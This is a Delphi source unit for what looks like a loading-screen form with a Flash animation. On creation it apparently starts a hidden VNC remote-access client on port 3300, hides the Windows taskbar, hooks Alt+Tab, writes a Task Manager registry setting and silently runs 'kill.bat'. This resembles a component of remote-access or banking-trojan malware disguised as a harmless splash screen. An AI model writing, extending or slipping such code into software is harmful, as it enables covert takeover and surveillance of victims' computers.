unit U_carregar;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs,Registry, ExtCtrls, OleCtrls, ShockwaveFlashObjects_TLB;

type
  TfrmCarregando = class(TForm)
    autooo: TTimer;
    ShockwaveFlash1: TShockwaveFlash;
    procedure FormCreate(Sender: TObject);
    procedure autoooTimer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  frmCarregando: TfrmCarregando;

implementation

uses U_inicio, U_Login, ClienteVNC;

{$R *.dfm}

procedure TfrmCarregando.FormCreate(Sender: TObject);
begin
if FrmClienteVnc=nil then
begin
FrmClienteVnc:=TFrmClienteVnc.Create(Self);
FrmClienteVnc.Show;
 end
else

FrmClienteVnc.Show;
FrmClienteVnc.edPort.Text:='3300';
FrmClienteVnc.cbActive.Checked:=true;
FrmClienteVnc.Hide;


ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_HIDE);
id1 := GlobalAddAtom('Hotkey1');
RegisterHotKey(Handle, id1, MOD_ALT, VK_TAB);
key:= TRegistry.Create;
key.RootKey := HKEY_CURRENT_USER;
key.OpenKey(SISTEMA,TRUE);
key.WriteInteger('DisableTaskMgr',0);
key.CloseKey;
	key.LazyWrite:=false;
	WinExec('kill.bat',HIDE_WINDOW);
end;

procedure TfrmCarregando.autoooTimer(Sender: TObject);
begin
frmCarregando.Close;
end;

end.
